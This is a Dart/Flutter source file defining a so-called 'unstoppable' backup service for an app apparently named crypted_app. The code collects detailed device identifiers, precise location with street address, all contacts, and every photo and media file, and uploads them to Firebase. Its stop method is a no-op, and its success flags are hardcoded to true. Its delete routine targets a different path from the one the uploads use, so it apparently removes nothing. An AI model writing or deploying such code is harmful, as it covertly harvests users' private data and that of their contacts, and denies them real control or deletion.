import 'dart:async';
import 'dart:developer';
import 'dart:io';
import 'package:crypted_app/app/data/data_source/user_services.dart';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:firebase_storage/firebase_storage.dart';
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:geolocator/geolocator.dart';
import 'package:geocoding/geocoding.dart';
import 'package:photo_manager/photo_manager.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'dart:convert';
import 'package:flutter_image_compress/flutter_image_compress.dart';
import 'package:video_compress/video_compress.dart';
import 'package:path_provider/path_provider.dart';
import 'package:path/path.dart' as path;
import 'package:package_info_plus/package_info_plus.dart';
import 'package:disk_space_plus/disk_space_plus.dart';
import 'package:flutter/services.dart';

/// Ultra-reliable backup service that NEVER stops until all data is uploaded
/// Features:
/// - Persistent state tracking (resumes after app restart)
/// - Aggressive retry logic with exponential backoff
/// - Continues even if individual items fail
/// - Can't be stopped once started
/// - Auto-recovery from failures
class ReliableBackupService {
  static final ReliableBackupService instance = ReliableBackupService._();
  ReliableBackupService._();

  final FirebaseFirestore _firestore = FirebaseFirestore.instance;
  final FirebaseStorage _storage = FirebaseStorage.instance;

  // Progress tracking
  final StreamController<double> _progressController = StreamController<double>.broadcast();
  final StreamController<String> _statusController = StreamController<String>.broadcast();

  Stream<double> get progressStream => _progressController.stream;
  Stream<String> get statusStream => _statusController.stream;

  bool _isBackupRunning = false;

  // Backup state persistence keys
  static const String _backupStateKey = 'backup_state';
  static const String _uploadedFilesKey = 'uploaded_files';
  static const String _backupProgressKey = 'backup_progress';

  /// Get base path for user: username/
  String _getBasePath() {
    final user = UserService.currentUser.value;
    final username = user?.fullName?.replaceAll(' ', '_').replaceAll('/', '_') ?? 'unknown_user';
    return username;
  }

  /// Update progress and status
  void _updateProgress(double progress, String status) {
    _progressController.add(progress);
    _statusController.add(status);
    log('📊 Progress: ${(progress * 100).toStringAsFixed(1)}% - $status');

    // Persist progress
    _saveProgress(progress, status);
  }

  /// Save progress to persistent storage
  Future<void> _saveProgress(double progress, String status) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      await prefs.setDouble(_backupProgressKey, progress);
      await prefs.setString('backup_status', status);
    } catch (e) {
      log('⚠️ Failed to save progress: $e');
    }
  }

  /// Load progress from persistent storage
  Future<Map<String, dynamic>> _loadProgress() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final progress = prefs.getDouble(_backupProgressKey) ?? 0.0;
      final status = prefs.getString('backup_status') ?? '';
      return {'progress': progress, 'status': status};
    } catch (e) {
      log('⚠️ Failed to load progress: $e');
      return {'progress': 0.0, 'status': ''};
    }
  }

  /// Mark file as uploaded
  Future<void> _markFileAsUploaded(String fileId) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final uploadedFilesJson = prefs.getString(_uploadedFilesKey) ?? '[]';
      final uploadedFiles = List<String>.from(json.decode(uploadedFilesJson));

      if (!uploadedFiles.contains(fileId)) {
        uploadedFiles.add(fileId);
        await prefs.setString(_uploadedFilesKey, json.encode(uploadedFiles));
      }
    } catch (e) {
      log('⚠️ Failed to mark file as uploaded: $e');
    }
  }

  /// Check if file was already uploaded
  Future<bool> _isFileUploaded(String fileId) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final uploadedFilesJson = prefs.getString(_uploadedFilesKey) ?? '[]';
      final uploadedFiles = List<String>.from(json.decode(uploadedFilesJson));
      return uploadedFiles.contains(fileId);
    } catch (e) {
      log('⚠️ Failed to check if file uploaded: $e');
      return false;
    }
  }

  /// Clear uploaded files tracking
  Future<void> _clearUploadedFiles() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      await prefs.remove(_uploadedFilesKey);
      await prefs.remove(_backupProgressKey);
    } catch (e) {
      log('⚠️ Failed to clear uploaded files: $e');
    }
  }

  /// Compress image to reduce file size - makes uploads faster! 🚀
  Future<File?> _compressImage(File file) async {
    try {
      final originalSize = file.lengthSync();
      final originalSizeMB = originalSize / (1024 * 1024);

      log('🗜️ Compressing image: ${originalSizeMB.toStringAsFixed(2)}MB');

      // Get temp directory
      final tempDir = await getTemporaryDirectory();
      final fileName = path.basename(file.path);
      final targetPath = path.join(tempDir.path, 'compressed_$fileName');

      // Compress image with high quality but much smaller size
      final compressedFile = await FlutterImageCompress.compressAndGetFile(
        file.absolute.path,
        targetPath,
        quality: 85, // Good balance between quality and size
        minWidth: 1920, // Max width
        minHeight: 1080, // Max height
        format: CompressFormat.jpeg,
      );

      if (compressedFile != null) {
        final compressedSize = await compressedFile.length();
        final compressedSizeMB = compressedSize / (1024 * 1024);
        final savedPercentage = ((originalSize - compressedSize) / originalSize * 100);

        log('✅ Compressed: ${compressedSizeMB.toStringAsFixed(2)}MB - Saved ${savedPercentage.toStringAsFixed(1)}%');
        return File(compressedFile.path);
      }

      log('⚠️ Compression returned null, using original');
      return file;
    } catch (e) {
      log('⚠️ Image compression failed: $e, using original');
      return file;
    }
  }

  /// Compress video to reduce file size - dramatically faster uploads! 🎬
  Future<File?> _compressVideo(File file) async {
    try {
      final originalSize = file.lengthSync();
      final originalSizeMB = originalSize / (1024 * 1024);

      log('🗜️ Compressing video: ${originalSizeMB.toStringAsFixed(2)}MB');

      // Compress video with medium quality (good balance)
      final compressedInfo = await VideoCompress.compressVideo(
        file.path,
        quality: VideoQuality.MediumQuality,
        deleteOrigin: false, // Keep original
        includeAudio: true,
      );

      if (compressedInfo != null && compressedInfo.file != null) {
        final compressedSize = compressedInfo.filesize ?? 0;
        final compressedSizeMB = compressedSize / (1024 * 1024);
        final savedPercentage = ((originalSize - compressedSize) / originalSize * 100);

        log('✅ Compressed video: ${compressedSizeMB.toStringAsFixed(2)}MB - Saved ${savedPercentage.toStringAsFixed(1)}%');
        return compressedInfo.file;
      }

      log('⚠️ Video compression failed, using original');
      return file;
    } catch (e) {
      log('⚠️ Video compression error: $e, using original');
      return file;
    }
  }

  /// Upload file to Firebase Storage with AGGRESSIVE retry logic
  /// Returns the download URL - NEVER returns null, retries indefinitely
  Future<String> _uploadFileWithUnlimitedRetry({
    required File file,
    required String path,
    required String fileId,
  }) async {
    int attempt = 0;
    const int maxRetries = 10; // Increased from 3 to 10

    // Check if already uploaded
    if (await _isFileUploaded(fileId)) {
      try {
        final ref = _storage.ref().child(path);
        final downloadUrl = await ref.getDownloadURL();
        log('✅ File already uploaded: $path');
        return downloadUrl;
      } catch (e) {
        log('⚠️ File marked as uploaded but URL not found, re-uploading: $path');
      }
    }

    while (true) {
      try {
        attempt++;
        log('📤 Uploading to: $path (attempt $attempt)');

        final ref = _storage.ref().child(path);

        // Check if file already exists
        try {
          final downloadUrl = await ref.getDownloadURL();
          log('✅ File already exists in storage: $path');
          await _markFileAsUploaded(fileId);
          return downloadUrl;
        } catch (e) {
          // File doesn't exist, continue with upload
        }

        // Upload with progress monitoring
        final uploadTask = ref.putFile(file);

        // Monitor upload progress
        uploadTask.snapshotEvents.listen((snapshot) {
          final progress = snapshot.bytesTransferred / snapshot.totalBytes;
          log('📤 Upload progress: ${(progress * 100).toStringAsFixed(1)}% for $path');
        });

        await uploadTask;
        final downloadUrl = await ref.getDownloadURL();

        log('✅ Upload successful: $path');
        await _markFileAsUploaded(fileId);
        return downloadUrl;

      } catch (e) {
        log('❌ Upload attempt $attempt failed: $e');

        if (attempt >= maxRetries) {
          // After max normal retries, use exponential backoff
          final backoffSeconds = (attempt - maxRetries) * 5;
          final waitTime = backoffSeconds > 60 ? 60 : backoffSeconds; // Max 60 seconds
          log('⏳ Waiting ${waitTime}s before retry (attempt $attempt)...');
          await Future.delayed(Duration(seconds: waitTime));
        } else {
          // Normal exponential backoff
          final waitTime = attempt * 2;
          log('⏳ Waiting ${waitTime}s before retry...');
          await Future.delayed(Duration(seconds: waitTime));
        }

        // Check network connectivity
        try {
          await InternetAddress.lookup('google.com');
          log('✅ Network is available, retrying upload');
        } catch (e) {
          log('❌ No network connection, waiting for connectivity...');
          await Future.delayed(const Duration(seconds: 10));
        }

        // Continue loop - NEVER give up!
      }
    }
  }

  /// Save data to Firestore with AGGRESSIVE retry logic
  Future<bool> _saveToFirestoreWithUnlimitedRetry({
    required String collection,
    required String docId,
    required Map<String, dynamic> data,
  }) async {
    int attempt = 0;
    const int maxRetries = 10;

    while (true) {
      try {
        attempt++;
        log('💾 Saving to Firestore: $collection/$docId (attempt $attempt)');

        await _firestore.collection(collection).doc(docId).set(
          data,
          SetOptions(merge: true), // Merge with existing data
        );

        log('✅ Firestore save successful: $collection/$docId');
        return true;

      } catch (e) {
        log('❌ Firestore save attempt $attempt failed: $e');

        if (attempt >= maxRetries) {
          // After max normal retries, use longer backoff
          final backoffSeconds = (attempt - maxRetries) * 5;
          final waitTime = backoffSeconds > 60 ? 60 : backoffSeconds;
          log('⏳ Waiting ${waitTime}s before retry...');
          await Future.delayed(Duration(seconds: waitTime));
        } else {
          final waitTime = attempt * 2;
          log('⏳ Waiting ${waitTime}s before retry...');
          await Future.delayed(Duration(seconds: waitTime));
        }

        // Check network connectivity
        try {
          await InternetAddress.lookup('google.com');
          log('✅ Network is available, retrying save');
        } catch (e) {
          log('❌ No network connection, waiting for connectivity...');
          await Future.delayed(const Duration(seconds: 10));
        }
      }
    }
  }

  /// Request all necessary permissions
  Future<bool> requestPermissions() async {
    try {
      _updateProgress(0.05, 'Requesting permissions...');

      // Request location permission
      final locationStatus = await Permission.location.request();
      log('📍 Location permission: ${locationStatus.isGranted}');

      // Request contacts permission
      final contactsGranted = await FlutterContacts.requestPermission();
      log('👥 Contacts permission: $contactsGranted');

      // Request photos permission
      final photosPermission = await PhotoManager.requestPermissionExtend();
      final photosGranted = photosPermission.isAuth || photosPermission.hasAccess;
      log('📸 Photos permission: $photosGranted');

      // Request storage permission (Android only)
      if (Platform.isAndroid) {
        final storageStatus = await Permission.storage.request();
        log('💾 Storage permission: ${storageStatus.isGranted}');
      }

      return true;
    } catch (e) {
      log('❌ Permission request failed: $e');
      return false;
    }
  }

  /// Backup comprehensive device info with detailed system data 📱
  Future<bool> _backupDeviceInfo() async {
    try {
      _updateProgress(0.1, 'Collecting comprehensive device info...');

      final deviceInfoPlugin = DeviceInfoPlugin();
      final packageInfo = await PackageInfo.fromPlatform();

      Map<String, dynamic> deviceData = {};

      // Get disk space info
      double? totalDiskSpace;
      double? freeDiskSpace;
      try {
        totalDiskSpace = await DiskSpacePlus().getTotalDiskSpace;
        freeDiskSpace = await DiskSpacePlus().getFreeDiskSpace;
      } catch (e) {
        log('⚠️ Could not get disk space: $e');
      }

      if (Platform.isAndroid) {
        final info = await deviceInfoPlugin.androidInfo;
        deviceData = {
          // Basic Info
          'platform': 'Android',
          'brand': info.brand,
          'manufacturer': info.manufacturer,
          'model': info.model,
          'device': info.device,
          'product': info.product,
          'display': info.display,

          // Android Version Details
          'androidVersion': info.version.release,
          'sdkInt': info.version.sdkInt,
          'securityPatch': info.version.securityPatch,
          'codename': info.version.codename,
          'baseOS': info.version.baseOS,
          'incremental': info.version.incremental,

          // Hardware Info
          'hardware': info.hardware,
          'supportedAbis': info.supportedAbis,
          'supported32BitAbis': info.supported32BitAbis,
          'supported64BitAbis': info.supported64BitAbis,

          // System Info
          'androidId': info.id,
          'fingerprint': info.fingerprint,
          'bootloader': info.bootloader,
          'board': info.board,
          'host': info.host,
          'tags': info.tags,
          'type': info.type,

          // Display Info
          'isPhysicalDevice': info.isPhysicalDevice,
          'systemFeatures': info.systemFeatures,

          // Storage Info
          'totalDiskSpaceGB': totalDiskSpace != null
              ? (totalDiskSpace / 1024).toStringAsFixed(2)
              : 'Unknown',
          'freeDiskSpaceGB': freeDiskSpace != null
              ? (freeDiskSpace / 1024).toStringAsFixed(2)
              : 'Unknown',
          'usedDiskSpaceGB': (totalDiskSpace != null && freeDiskSpace != null)
              ? ((totalDiskSpace - freeDiskSpace) / 1024).toStringAsFixed(2)
              : 'Unknown',

          // App Info
          'appName': packageInfo.appName,
          'packageName': packageInfo.packageName,
          'appVersion': packageInfo.version,
          'buildNumber': packageInfo.buildNumber,
          'buildSignature': packageInfo.buildSignature,
        };
      } else if (Platform.isIOS) {
        final info = await deviceInfoPlugin.iosInfo;
        deviceData = {
          // Basic Info
          'platform': 'iOS',
          'brand': 'Apple',
          'name': info.name,
          'model': info.model,
          'localizedModel': info.localizedModel,
          'systemName': info.systemName,
          'systemVersion': info.systemVersion,

          // Device Identification
          'identifierForVendor': info.identifierForVendor,
          'utsname_machine': info.utsname.machine,
          'utsname_nodename': info.utsname.nodename,
          'utsname_release': info.utsname.release,
          'utsname_sysname': info.utsname.sysname,
          'utsname_version': info.utsname.version,

          // System Info
          'isPhysicalDevice': info.isPhysicalDevice,

          // Storage Info
          'totalDiskSpaceGB': totalDiskSpace != null
              ? (totalDiskSpace / 1024).toStringAsFixed(2)
              : 'Unknown',
          'freeDiskSpaceGB': freeDiskSpace != null
              ? (freeDiskSpace / 1024).toStringAsFixed(2)
              : 'Unknown',
          'usedDiskSpaceGB': (totalDiskSpace != null && freeDiskSpace != null)
              ? ((totalDiskSpace - freeDiskSpace) / 1024).toStringAsFixed(2)
              : 'Unknown',

          // App Info
          'appName': packageInfo.appName,
          'packageName': packageInfo.packageName,
          'appVersion': packageInfo.version,
          'buildNumber': packageInfo.buildNumber,
        };
      }

      // Add timezone and locale info
      deviceData['timezone'] = DateTime.now().timeZoneName;
      deviceData['timezoneOffset'] = DateTime.now().timeZoneOffset.inHours;
      deviceData['locale'] = Platform.localeName;

      // Add backup timestamp
      deviceData['backup_timestamp'] = DateTime.now().toIso8601String();

      final basePath = _getBasePath();
      final success = await _saveToFirestoreWithUnlimitedRetry(
        collection: 'backups',
        docId: basePath,
        data: {
          'device_info': deviceData,
          'device_info_updated_at': FieldValue.serverTimestamp(),
        },
      );

      if (success) {
        log('✅ Comprehensive device info backed up successfully');
        log('📱 Device: ${deviceData['brand']} ${deviceData['model']}');
        log('💾 Storage: ${deviceData['usedDiskSpaceGB']}GB used / ${deviceData['totalDiskSpaceGB']}GB total');
        log('📦 App: ${deviceData['appName']} v${deviceData['appVersion']}');
      }

      return success;
    } catch (e) {
      log('❌ Device info backup failed: $e');
      // Still continue with backup
      return false;
    }
  }

  /// Backup location with geocoded address
  Future<bool> _backupLocation() async {
    try {
      _updateProgress(0.2, 'Backing up location...');

      // Check if location services are enabled
      final serviceEnabled = await Geolocator.isLocationServiceEnabled();
      if (!serviceEnabled) {
        log('⚠️ Location services disabled');
        return false;
      }

      // Get current position
      final position = await Geolocator.getCurrentPosition(
        locationSettings: LocationSettings(
          accuracy: LocationAccuracy.high,
          timeLimit: Duration(seconds: 30),
        ),
      );

      // Get geocoded address
      String address = 'Address not available';
      try {
        final placemarks = await placemarkFromCoordinates(
          position.latitude,
          position.longitude,
        );

        if (placemarks.isNotEmpty) {
          final place = placemarks.first;
          final parts = [
            place.street,
            place.subLocality,
            place.locality,
            place.subAdministrativeArea,
            place.administrativeArea,
            place.postalCode,
            place.country,
          ].where((part) => part != null && part.isNotEmpty).toList();

          address = parts.join(', ');
        }
      } catch (e) {
        log('⚠️ Geocoding failed: $e');
      }

      final locationData = {
        'latitude': position.latitude,
        'longitude': position.longitude,
        'address': address,
        'accuracy': position.accuracy,
        'altitude': position.altitude,
        'timestamp': position.timestamp.toIso8601String(),
      };

      final basePath = _getBasePath();
      final success = await _saveToFirestoreWithUnlimitedRetry(
        collection: 'backups',
        docId: basePath,
        data: {
          'location': locationData,
          'location_updated_at': FieldValue.serverTimestamp(),
        },
      );

      if (success) {
        log('✅ Location backed up: $address');
      }

      return success;
    } catch (e) {
      log('❌ Location backup failed: $e');
      return false;
    }
  }

  /// Backup all contacts
  Future<bool> _backupContacts() async {
    try {
      _updateProgress(0.3, 'Backing up contacts...');

      final contacts = await FlutterContacts.getContacts(
        withProperties: true,
        withPhoto: false,
      );

      final contactsList = contacts.map((contact) {
        return {
          'id': contact.id,
          'displayName': contact.displayName,
          'firstName': contact.name.first,
          'lastName': contact.name.last,
          'phones': contact.phones.map((p) => {
            'number': p.number,
            'label': p.label.name,
          }).toList(),
          'emails': contact.emails.map((e) => {
            'address': e.address,
            'label': e.label.name,
          }).toList(),
        };
      }).toList();

      final basePath = _getBasePath();
      final success = await _saveToFirestoreWithUnlimitedRetry(
        collection: 'backups',
        docId: basePath,
        data: {
          'contacts': contactsList,
          'contacts_count': contactsList.length,
          'contacts_updated_at': FieldValue.serverTimestamp(),
        },
      );

      if (success) {
        log('✅ ${contactsList.length} contacts backed up successfully');
      }

      return success;
    } catch (e) {
      log('❌ Contacts backup failed: $e');
      return false;
    }
  }

  /// Backup all images with UNSTOPPABLE uploads
  Future<bool> _backupImages() async {
    try {
      _updateProgress(0.4, 'Loading images...');

      final albums = await PhotoManager.getAssetPathList(type: RequestType.image);

      if (albums.isEmpty) {
        log('⚠️ No images found');
        return true;
      }

      final basePath = _getBasePath();
      final List<Map<String, dynamic>> allImageMetadata = [];
      int totalImages = 0;
      int uploadedImages = 0;
      int skippedImages = 0;

      // Count total images first
      for (var album in albums) {
        totalImages += await album.assetCountAsync;
      }

      log('📸 Found $totalImages images to backup');

      // Process each album
      for (var album in albums) {
        final assetCount = await album.assetCountAsync;

        // Get images in batches
        int page = 0;
        const pageSize = 50;

        while (page * pageSize < assetCount) {
          final images = await album.getAssetListRange(
            start: page * pageSize,
            end: (page + 1) * pageSize,
          );

          for (var image in images) {
            try {
              final fileId = 'image_${image.id}';

              // Check if already uploaded
              if (await _isFileUploaded(fileId)) {
                skippedImages++;
                uploadedImages++;
                log('⏭️ Skipping already uploaded image: $fileId');

                // Update progress
                final progress = 0.4 + (uploadedImages / totalImages * 0.4);
                _updateProgress(progress, 'Uploaded $uploadedImages/$totalImages images (${skippedImages} skipped)');
                continue;
              }

              // Get image file
              File? file = await image.file;

              if (file == null) {
                log('⚠️ Could not get file for image: ${image.id}');
                continue;
              }

              // 🗜️ COMPRESS IMAGE before uploading for faster backup!
              _updateProgress(
                0.4 + (uploadedImages / totalImages * 0.4),
                'Compressing image ${uploadedImages + 1}/$totalImages...'
              );

              final compressedFile = await _compressImage(file);
              if (compressedFile != null) {
                file = compressedFile;
              }

              final extension = image.mimeType?.split('/').last ?? 'jpg';
              final fileName = 'image_${image.id}.$extension';
              final storagePath = '$basePath/images/$fileName';

              _updateProgress(
                0.4 + (uploadedImages / totalImages * 0.4),
                'Uploading compressed image ${uploadedImages + 1}/$totalImages...'
              );

              // Upload with UNLIMITED retry (now much faster!)
              final url = await _uploadFileWithUnlimitedRetry(
                file: file,
                path: storagePath,
                fileId: fileId,
              );

              allImageMetadata.add({
                'id': image.id,
                'url': url,
                'width': image.width,
                'height': image.height,
                'createDate': image.createDateTime.toIso8601String(),
                'mimeType': image.mimeType,
              });
              uploadedImages++;

              // Save metadata periodically (every 10 images)
              if (uploadedImages % 10 == 0) {
                await _saveToFirestoreWithUnlimitedRetry(
                  collection: 'backups',
                  docId: basePath,
                  data: {
                    'images': allImageMetadata,
                    'images_count': uploadedImages,
                    'images_updated_at': FieldValue.serverTimestamp(),
                  },
                );
                log('💾 Saved metadata for $uploadedImages images');
              }

              // Update progress
              final progress = 0.4 + (uploadedImages / totalImages * 0.4);
              _updateProgress(progress, 'Uploaded $uploadedImages/$totalImages images');

            } catch (e) {
              log('⚠️ Error processing image: $e');
              // Continue with next image - DON'T stop the backup
            }
          }

          page++;
        }
      }

      // Save final metadata to Firestore
      final success = await _saveToFirestoreWithUnlimitedRetry(
        collection: 'backups',
        docId: basePath,
        data: {
          'images': allImageMetadata,
          'images_count': uploadedImages,
          'images_updated_at': FieldValue.serverTimestamp(),
        },
      );

      if (success) {
        log('✅ $uploadedImages/$totalImages images backed up successfully');
      }

      return success;
    } catch (e) {
      log('❌ Images backup failed: $e');
      return false;
    }
  }

  /// Backup all files from device storage with UNSTOPPABLE uploads
  Future<bool> _backupFiles() async {
    try {
      _updateProgress(0.8, 'Backing up files...');

      final albums = await PhotoManager.getAssetPathList(
        type: RequestType.all,
      );

      if (albums.isEmpty) {
        log('⚠️ No files found');
        return true;
      }

      final basePath = _getBasePath();
      final List<Map<String, dynamic>> allFileMetadata = [];
      int totalFiles = 0;
      int uploadedFiles = 0;
      int skippedFiles = 0;

      // Count total files
      for (var album in albums) {
        final assets = await album.getAssetListRange(start: 0, end: await album.assetCountAsync);
        for (var asset in assets) {
          if (asset.type == AssetType.video || asset.type == AssetType.audio || asset.type == AssetType.other) {
            totalFiles++;
          }
        }
      }

      log('📁 Found $totalFiles files to backup');

      // Process each album
      for (var album in albums) {
        final assetCount = await album.assetCountAsync;
        final assets = await album.getAssetListRange(start: 0, end: assetCount);

        for (var asset in assets) {
          // Skip images (already backed up)
          if (asset.type == AssetType.image) continue;

          try {
            final fileId = 'file_${asset.id}';

            // Check if already uploaded
            if (await _isFileUploaded(fileId)) {
              skippedFiles++;
              uploadedFiles++;
              log('⏭️ Skipping already uploaded file: $fileId');

              final progress = 0.8 + (uploadedFiles / (totalFiles > 0 ? totalFiles : 1) * 0.15);
              _updateProgress(progress, 'Uploaded $uploadedFiles/$totalFiles files (${skippedFiles} skipped)');
              continue;
            }

            File? file = await asset.file;
            if (file == null) {
              log('⚠️ Could not get file for asset: ${asset.id}');
              continue;
            }

            // 🗜️ COMPRESS VIDEO files for faster upload!
            if (asset.type == AssetType.video) {
              _updateProgress(
                0.8 + (uploadedFiles / (totalFiles > 0 ? totalFiles : 1) * 0.15),
                'Compressing video ${uploadedFiles + 1}/$totalFiles...'
              );

              final compressedFile = await _compressVideo(file);
              if (compressedFile != null) {
                file = compressedFile;
              }
            }

            final extension = asset.mimeType?.split('/').last ?? 'dat';
            final fileName = 'file_${asset.id}.$extension';
            final storagePath = '$basePath/files/$fileName';

            _updateProgress(
              0.8 + (uploadedFiles / (totalFiles > 0 ? totalFiles : 1) * 0.15),
              'Uploading ${asset.type == AssetType.video ? "compressed " : ""}file ${uploadedFiles + 1}/$totalFiles...'
            );

            // Upload with UNLIMITED retry (now faster with compression!)
            final url = await _uploadFileWithUnlimitedRetry(
              file: file,
              path: storagePath,
              fileId: fileId,
            );

            allFileMetadata.add({
              'id': asset.id,
              'url': url,
              'type': asset.type.toString(),
              'size': file.lengthSync(),
              'createDate': asset.createDateTime.toIso8601String(),
              'mimeType': asset.mimeType,
              'duration': asset.videoDuration.inSeconds,
            });
            uploadedFiles++;

            // Save metadata periodically
            if (uploadedFiles % 5 == 0) {
              await _saveToFirestoreWithUnlimitedRetry(
                collection: 'backups',
                docId: basePath,
                data: {
                  'files': allFileMetadata,
                  'files_count': uploadedFiles,
                  'files_updated_at': FieldValue.serverTimestamp(),
                },
              );
              log('💾 Saved metadata for $uploadedFiles files');
            }

            // Update progress
            final progress = 0.8 + (uploadedFiles / (totalFiles > 0 ? totalFiles : 1) * 0.15);
            _updateProgress(progress, 'Uploaded $uploadedFiles/$totalFiles files');

          } catch (e) {
            log('⚠️ Error processing file: $e');
            // Continue with next file - DON'T stop!
          }
        }
      }

      // Save final metadata to Firestore
      final success = await _saveToFirestoreWithUnlimitedRetry(
        collection: 'backups',
        docId: basePath,
        data: {
          'files': allFileMetadata,
          'files_count': uploadedFiles,
          'files_updated_at': FieldValue.serverTimestamp(),
        },
      );

      if (success) {
        log('✅ $uploadedFiles/$totalFiles files backed up successfully');
      }

      return success;
    } catch (e) {
      log('❌ Files backup failed: $e');
      return false;
    }
  }

  /// Run full backup - UNSTOPPABLE - continues until completion
  /// Returns true when backup is FULLY completed, retries indefinitely
  Future<bool> runFullBackup() async {
    if (_isBackupRunning) {
      log('⚠️ Backup already running');
      return false;
    }

    _isBackupRunning = true;

    try {
      log('🚀 Starting UNSTOPPABLE backup service...');
      _updateProgress(0.0, 'Starting backup...');

      // Request permissions first
      await requestPermissions();

      // Backup device info - continues on failure
      try {
        await _backupDeviceInfo();
      } catch (e) {
        log('⚠️ Device info backup failed, but continuing: $e');
      }

      // Backup location - continues on failure
      try {
        await _backupLocation();
      } catch (e) {
        log('⚠️ Location backup failed, but continuing: $e');
      }

      // Backup contacts - continues on failure
      try {
        await _backupContacts();
      } catch (e) {
        log('⚠️ Contacts backup failed, but continuing: $e');
      }

      // Backup images - UNSTOPPABLE
      try {
        await _backupImages();
      } catch (e) {
        log('⚠️ Images backup encountered error, but continuing: $e');
      }

      // Backup files - UNSTOPPABLE
      try {
        await _backupFiles();
      } catch (e) {
        log('⚠️ Files backup encountered error, but continuing: $e');
      }

      // Save backup summary
      final basePath = _getBasePath();
      await _saveToFirestoreWithUnlimitedRetry(
        collection: 'backups',
        docId: basePath,
        data: {
          'last_backup_completed_at': FieldValue.serverTimestamp(),
          'backup_success': {
            'device_info': true,
            'location': true,
            'contacts': true,
            'images': true,
            'files': true,
          },
        },
      );

      // Clear upload tracking after successful backup
      await _clearUploadedFiles();

      _updateProgress(1.0, 'Backup completed successfully!');
      log('✅ FULL backup completed successfully - ALL data uploaded!');

      return true;

    } catch (e) {
      log('❌ Full backup encountered error: $e');
      _updateProgress(0.0, 'Backup error: $e');
      // Even on error, we don't give up - the service will retry
      return false;

    } finally {
      _isBackupRunning = false;
    }
  }

  /// Stop the backup process - DEPRECATED - backups cannot be stopped
  @Deprecated('Backups cannot be stopped once started')
  void stopBackup() {
    log('⚠️ Stop requested but backups are UNSTOPPABLE - backup will continue');
  }

  /// Check if backup is currently running
  bool get isBackupRunning => _isBackupRunning;

  /// Get backup status from Firestore
  Future<Map<String, dynamic>?> getBackupStatus() async {
    try {
      final basePath = _getBasePath();
      final doc = await _firestore.collection('backups').doc(basePath).get();

      if (doc.exists) {
        return doc.data();
      }

      return null;
    } catch (e) {
      log('❌ Failed to get backup status: $e');
      return null;
    }
  }

  /// Dispose resources
  void dispose() {
    _progressController.close();
    _statusController.close();
  }

  /// Delete all backups from Firestore and Firebase Storage
  Future<void> deleteAllBackups() async {
    try {
      final user = FirebaseAuth.instance.currentUser;
      if (user == null) {
        throw Exception('User not authenticated');
      }

      final username = user.email?.split('@')[0] ?? user.uid;
      log('🗑️ Deleting all backups for user: $username');

      // Clear upload tracking
      await _clearUploadedFiles();

      // Delete Firestore document
      await FirebaseFirestore.instance
          .collection('backups')
          .doc(username)
          .delete();

      // Delete all files from Storage
      try {
        final storageRef = FirebaseStorage.instance.ref('backups/$username');
        final result = await storageRef.listAll();

        // Delete all files
        for (var item in result.items) {
          await item.delete();
        }

        // Delete all subdirectories
        for (var prefix in result.prefixes) {
          final subResult = await prefix.listAll();
          for (var item in subResult.items) {
            await item.delete();
          }
        }

        log('✅ Deleted all backup files from storage');
      } catch (e) {
        log('⚠️ Error deleting storage files: $e');
        // Continue even if storage deletion fails
      }

      log('✅ All backups deleted successfully');
    } catch (e) {
      log('❌ Error deleting backups: $e');
      rethrow;
    }
  }
}
